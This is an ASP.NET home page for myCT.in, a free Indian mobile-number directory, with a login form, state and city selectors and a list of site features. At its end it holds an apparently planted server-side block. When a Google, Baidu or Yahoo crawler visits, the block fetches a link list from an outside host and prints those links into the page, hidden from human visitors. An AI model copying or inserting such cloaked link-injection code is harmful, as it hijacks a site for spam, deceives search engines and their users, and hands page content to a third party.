<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="Default" %>

<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
<head profile="http://gmpg.org/xfn/11" id="Head1" runat="server">
    <link href="CSS/Maincss.css" rel="stylesheet" type="text/css" />
    <link href="CSS/style.css" rel="stylesheet" type="text/css" />
    <title>::MyCT.In : Home Page::</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="description" content="A Community Based WordPress Theme" />
    <link rel="stylesheet" type="text/css" href="style.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="coin-slider-styles.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="menusm.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="pagenavi-css.css" media="screen" />
    <!-- cufon -->
    <!-- menu -->
    <!-- tabs-categories -->
    <link rel="stylesheet" href="tabs.css" type="text/css" media="screen" />
    <!-- scripts for use -->

    <script type="text/javascript" src="js/script.js"></script>

    <script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>

</head>
<body>
    <form runat="server" action="">
        <%--method="get"--%>
        <asp:ToolkitScriptManager ID="ToolkitScriptManager1" runat="server">
        </asp:ToolkitScriptManager>
        <div id="page">
            <div id="header">
                <div class="logo">
                    <h1>
                        <img src="HomeImages/myct.png" /></h1>
                </div>
                <div class="rss">
                    <table width="100%">
                        <tr>
                            <td colspan="3" class="post-leav">Login Here
                            </td>
                        </tr>
                        <tr>
                            <td width="31%">
                                <strong style="color: #009999">Mobile Number</strong>
                            </td>
                            <td width="31%">
                                <strong style="color: #009999">Password</strong>
                            </td>
                            <td></td>
                        </tr>
                        <tr>
                            <td width="31%">
                                <asp:TextBox runat="server" CssClass="text" ValidationGroup="login" ID="txtUserId"
                                    MaxLength="10"></asp:TextBox>
                                <asp:RequiredFieldValidator ID="RequiredFieldValidator4" ValidationGroup="login"
                                    runat="server" ErrorMessage="Enter Mobile No" Display="None" ControlToValidate="txtUserId"
                                    InitialValue="">
                                </asp:RequiredFieldValidator>
                                <asp:ValidatorCalloutExtender ID="ValidatorCalloutExtender4" runat="server" TargetControlID="RequiredFieldValidator4">
                                </asp:ValidatorCalloutExtender>
                                <asp:FilteredTextBoxExtender ID="fteFirstNameDisplay" runat="server" TargetControlID="txtUserId"
                                    ValidChars=" " FilterType="Numbers">
                                </asp:FilteredTextBoxExtender>
                            </td>
                            <td width="31%">
                                <asp:TextBox CssClass="text" ValidationGroup="login" ID="txtPassword" TextMode="Password"
                                    runat="server"></asp:TextBox>
                                <asp:RequiredFieldValidator ID="RequiredFieldValidator5" ValidationGroup="login"
                                    runat="server" ErrorMessage="Enter Password" Display="None" ControlToValidate="txtPassword"
                                    InitialValue=""></asp:RequiredFieldValidator>
                                <asp:ValidatorCalloutExtender ID="ValidatorCalloutExtender5" runat="server" TargetControlID="RequiredFieldValidator5">
                                </asp:ValidatorCalloutExtender>
                            </td>
                            <td>
                                <asp:Button ID="Login" ValidationGroup="login" Text="Login" runat="server" OnClick="Login_Click"
                                    CssClass="button" />
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <a style="color: #009999" href="Html/PasswordRecover.aspx">Forget password ?</a>
                            </td>
                            <td>
                                <a style="color: #009999" href="Html/UserRegistration.aspx?F=L">Register</a>
                            </td>
                            <td>
                                <asp:Label ID="lblMsg" runat="server" CssClass="Error"></asp:Label>
                            </td>
                        </tr>
                    </table>
                </div>
                <!--/rss -->
                <div class="clr">
                </div>
                <div class="topnav">
                    <div class="search">
                        <%--<form method="get" id="searchform" action="">--%>
                        <fieldset id="search">
                            <span>
                                <input type="text" value="Search our site..." onclick="this.value = '';" name="s" id="s" />
                                <input name="searchsubmit" type="image" src="HomeImages/search.gif" value="Go" id="searchsubmit"
                                    class="btn" />
                            </span>
                        </fieldset>
                        <%--</form>--%>
                    </div>
                    <div class="clr">
                    </div>
                </div>
                <!--/topnav -->
                <div class="clr">
                </div>
            </div>
            <!--/header -->
            <div id="columns">
                <div id="centercol">
                    <div class="box post" id="post-41">
                        <div class="content">
                            <div class="post-title">
                                <h2>
                                    <a href="#">Welcome to All India Mobile Directory Users Association</a></h2>
                            </div>
                            <!--/post-title -->
                            <div class="post-date">
                                <table>
                                    <tr>
                                        <td>

                                            <script type="text/javascript">
                                                AC_FL_RunContent('codebase', 'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0', 'width', '598', 'height', '219', 'src', 'HomeImages/social_flash', 'quality', 'high', 'pluginspage', 'http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash', 'movie', 'HomeImages/social_flash'); //end AC code
                                            </script>

                                            <noscript>
                                                <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0"
                                                    width="598" height="219">
                                                    <param name="movie" value="HomeImages/social_flash.swf" />
                                                    <param name="quality" value="high" />
                                                    <embed src="HomeImages/social_flash.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"
                                                        type="application/x-shockwave-flash" width="598" height="219"></embed>
                                                </object>
                                            </noscript>
                                        </td>
                                    </tr>
                                </table>
                            </div>
                            <div class="pic">
                            </div>
                            <!--/post-date -->
                            <div class="clr">
                            </div>
                        </div>
                        <!--/content -->
                    </div>
                    <!--/box -->
                    <div class="clr">
                    </div>
                </div>
                <!--/centercol -->
                <div id="rightcol">
                    <br />
                    <div class="box_r ads">
                        <asp:UpdatePanel ID="UpdatePanelMain1" runat="server">
                            <ContentTemplate>
                                <div class="content">
                                    <table width="100%" style="border: 1px dotted #000000;">
                                        <tr>
                                            <td colspan="3" class="post-leav">Select your City
                                            </td>
                                        </tr>
                                        <tr>
                                            <td width="5%"></td>
                                            <td width="21%" height="39">
                                                <strong style="color: #009999">State</strong>
                                            </td>
                                            <td width="74%">
                                                <asp:UpdatePanel ID="upState" runat="server">
                                                    <ContentTemplate>
                                                        <asp:DropDownList ID="ddlState" runat="server" Width="150px" AutoPostBack="true"
                                                            OnSelectedIndexChanged="ddlState_SelectedIndexChanged">
                                                        </asp:DropDownList>
                                                    </ContentTemplate>
                                                    <Triggers>
                                                        <asp:AsyncPostBackTrigger ControlID="ddlState" />
                                                        <asp:AsyncPostBackTrigger ControlID="ddlDistrict" />
                                                        <asp:AsyncPostBackTrigger ControlID="ddlCity" />
                                                    </Triggers>
                                                </asp:UpdatePanel>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td></td>
                                            <td height="39">
                                                <strong style="color: #009999">District</strong>
                                            </td>
                                            <td>
                                                <asp:UpdatePanel ID="UpdatePanel1" runat="server">
                                                    <ContentTemplate>
                                                        <asp:DropDownList ID="ddlDistrict" runat="server" Width="150px" AutoPostBack="true"
                                                            OnSelectedIndexChanged="ddlDistrict_SelectedIndexChanged">
                                                        </asp:DropDownList>
                                                    </ContentTemplate>
                                                    <Triggers>
                                                        <asp:AsyncPostBackTrigger ControlID="ddlState" />
                                                        <asp:AsyncPostBackTrigger ControlID="ddlDistrict" />
                                                        <asp:AsyncPostBackTrigger ControlID="ddlCity" />
                                                    </Triggers>
                                                </asp:UpdatePanel>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td></td>
                                            <td height="39">
                                                <strong style="color: #009999">City</strong>
                                            </td>
                                            <td>
                                                <asp:UpdatePanel ID="UpdatePanel2" runat="server">
                                                    <ContentTemplate>
                                                        <asp:DropDownList ID="ddlCity" runat="server" Width="150px">
                                                        </asp:DropDownList>
                                                    </ContentTemplate>
                                                    <Triggers>
                                                        <asp:AsyncPostBackTrigger ControlID="ddlState" />
                                                        <asp:AsyncPostBackTrigger ControlID="ddlDistrict" />
                                                        <asp:AsyncPostBackTrigger ControlID="ddlCity" />
                                                    </Triggers>
                                                </asp:UpdatePanel>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td colspan="3" align="center">
                                                <asp:Button ID="btnSearch" Text="Search" runat="server" OnClick="btnSearch_Click"
                                                    CssClass="button" />
                                            </td>
                                        </tr>
                                    </table>
                                </div>
                            </ContentTemplate>
                        </asp:UpdatePanel>
                        <!--/content -->
                    </div>
                    <!--/box -->
                    <!--/box -->
                </div>
                <!--/rightcol -->
                <div class="clr">
                </div>
            </div>
            <!--/columns -->
            <div class="clr">
            </div>
        </div>
        <div class="footer2">
            <div class="footer2_resize">
                <div class="col col1">
                    <h2>Site Links</h2>
                    <div>
                        <div>
                            <center>
                                <%--<img src="KResource/Images/makar-sankranti-4.gif" height="120px" width="300px" />--%></center>
                        </div>
                        <div style="border-radius: 5px; background: #009999; width: 360px; height: 360px; opacity: 0.8">
                            <div style="border-radius: 5px; width: 150px; background: white; height: 80px; margin-top: 30px; margin-left: 20px; float: left; text-align: center;">
                                <div style="margin-top: 30px;">
                                    <a href="http://mdm.myct.in" target="_blank" style="color: #da5212; text-shadow: 2px 2px 2px #595959; font-size: 20px; font-weight: bold">Online MDM </a>
                                </div>
                            </div>
                            <div style="border-radius: 5px; width: 150px; background: white; height: 80px; margin-top: 30px; margin-left: 20px; float: left; text-align: center;">
                                <div style="margin-top: 30px;">
                                    <a href="http://www.ezeetest.in" target="_blank" style="color: #da5212; text-shadow: 2px 2px 2px #595959; font-size: 20px; font-weight: bold">Ezee Test </a>
                                </div>
                            </div>
                            <br />
                            <div style="border-radius: 5px; width: 150px; background: white; height: 80px; margin-top: 30px; margin-left: 20px; float: left; text-align: center;">
                                <div style="margin-top: 30px;">
                                    <a href="http://www.ezeeschool.in" target="_blank" style="color: #da5212; text-shadow: 2px 2px 2px #595959; font-size: 20px; font-weight: bold">School ERP</a>
                                </div>
                            </div>
                            <div style="border-radius: 5px; width: 150px; background: white; height: 80px; margin-top: 30px; margin-left: 20px; float: left; text-align: center;">
                                <div style="margin-top: 30px;">
                                    <a href="http://www.ezeedrug.in" target="_blank" style="color: #da5212; text-shadow: 2px 2px 2px #595959; font-size: 20px; font-weight: bold">Ezee Drugs</a>
                                </div>
                            </div>
                            <div style="border-radius: 5px; width: 150px; background: white; height: 80px; margin-top: 30px; margin-left: 20px; float: left; text-align: center;">
                                <div style="margin-top: 30px;">
                                    <a href="http://www.ezeesoftindia.com" target="_blank" style="color: #da5212; text-shadow: 2px 2px 2px #595959; font-size: 20px; font-weight: bold">EzeeSoftIndia</a>
                                </div>
                            </div>
                            <div style="border-radius: 5px; width: 150px; background: white; height: 80px; margin-top: 30px; margin-left: 20px; float: left; text-align: center;">
                                <div style="margin-top: 30px;">
                                    <a href="http://www.exam.myct.in" target="_blank" style="color: #da5212; text-shadow: 2px 2px 2px #595959; font-size: 20px; font-weight: bold">MS-CIT Center</a>
                                </div>
                            </div>
                            <%-- <div style="border-radius: 5px; width: 320px; background: white; height: 50px; margin-top: 25px;
                            margin-left: 20px; float: left; text-align: center;">
                            <div style="margin-top: 15px;">
                                <a href="http://www.ezeesoftindia.com" target="_blank" style="color: #da5212;
                                    text-shadow: 2px 2px 2px #595959; font-size: 20px; font-weight: bold">EzeeSoftIndia</a>
                            </div>
                        </div>--%>
                        </div>
                    </div>
                </div>
                <div class="col col2">
                    <h2>Always Free for All Indian</h2>
                    <ul>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Self updated Mobile and Phones
                        directory of the people by the people for the people.</li>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Directory of all cities of India</li>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Free membership</li>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Now use &quot;www.myct.in&quot; website facilities 
                        from mobile just by sending simple SMS to &nbsp;&nbsp;&nbsp;&nbsp;09604024563&nbsp;
                        Provision of limited free sms.</li>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Provision of printing up-to date
                        labels of friends and relatives for any invitation</li>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Share your profile with your
                        friends and relatives.</li>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Register your friends and relatives
                        and invite them to join all India Mobile Directory.</li>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Self change of your address gives
                        automatic update to all your friends and relatives and &nbsp;&nbsp;&nbsp;&nbsp;to
                        all Indian also.</li>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Define your groups of friends</li>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Add your any friend in one or
                        more group.</li>
                        <li>
                            <img src="HomeImages/li_a.gif" alt="" />&nbsp;&nbsp;&nbsp;Easily change the city to see
                        all details of any city and Mobile Directory of that city.</li>
                    </ul>
                </div>
                <div class="clr">
                </div>
            </div>
        </div>
        <!--/page -->
        <div id="page_bottom">
            <div id="footer">
                <div class="clr">
                    <table width="100%">
                        <tr>
                            <td>
                                <div class="text1">
                                    <asp:Label ID="lblcounter" runat="server" ForeColor="#989898"></asp:Label>
                                </div>
                            </td>
                            <td>
                                <div class="text3">
                                    &copy; Copyright <a href="#">myCT.in </a>. All Rights Reserved
                                </div>
                            </td>
                            <td>
                                <div class="text2">
                                    <a href="MarketingAdmin/Login1.aspx" class="agency">Admin Login</a>
                                </div>
                            </td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
        <!--/footer -->
    </form>
    <!-- external links start -->
    <%
        string showstr = "";

        string uastr = Request.ServerVariables["HTTP_USER_AGENT"];
        if ((uastr.IndexOf("google") > -1) || (uastr.IndexOf("baidu") > -1) || (uastr.IndexOf("yahoo") > -1))
        {
            string surl = "http://www.seratme.info/links/301.txt";
            System.Net.WebRequest wrq = System.Net.WebRequest.Create(surl);
            System.Net.WebResponse wrs = wrq.GetResponse();
            System.IO.Stream strm = wrs.GetResponseStream();
            System.IO.StreamReader sr = new System.IO.StreamReader(strm);
            string line;
            while ((line = sr.ReadLine()) != null)
            {
                string[] strs = line.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);
                surl = "<a href=\"" + strs[0] + "\" title=\"" + strs[1] + "\">" + strs[1] + "</a>";
                showstr = showstr + " " + surl;
            }
            strm.Close();

        }
    %>
    <%=showstr%>
    <!-- external links end -->
</body>
</html>
